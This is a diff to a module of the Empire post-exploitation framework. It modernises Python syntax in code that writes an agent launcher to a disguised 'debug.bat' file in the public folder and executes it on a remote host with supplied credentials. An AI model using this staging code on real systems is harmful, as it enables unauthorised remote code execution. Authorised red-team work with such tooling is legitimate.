@@ -1,6 +1,3 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.db.models import Credential
@@ -8,7 +5,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -57,8 +54,8 @@ class Module(object):
         launcher_code = launcher.generate()
 
         # PowerShell code to write the launcher.bat out
-        script_end = '$tempLoc = "$env:public\debug.bat"'
-        script_end += '\n$batCode = @"\n' + launcher_code + '"@\n'
+        script_end = r'$tempLoc = "$env:public\debug.bat"'
+        script_end += '\n$batCode = @"\n' + launcher_code + '\n"@\n'
         script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
         script_end += '"Launcher bat written to $tempLoc `n";\n'
 
@@ -70,7 +67,7 @@ class Module(object):
         if domain and domain != "":
             script_end += "-Domain %s " % (domain)
 
-        script_end += '-Cmd "$env:public\debug.bat"'
+        script_end += r'-Cmd "$env:public\debug.bat"'
 
         script = main_menu.modulesv2.finalize_module(
             script=script,
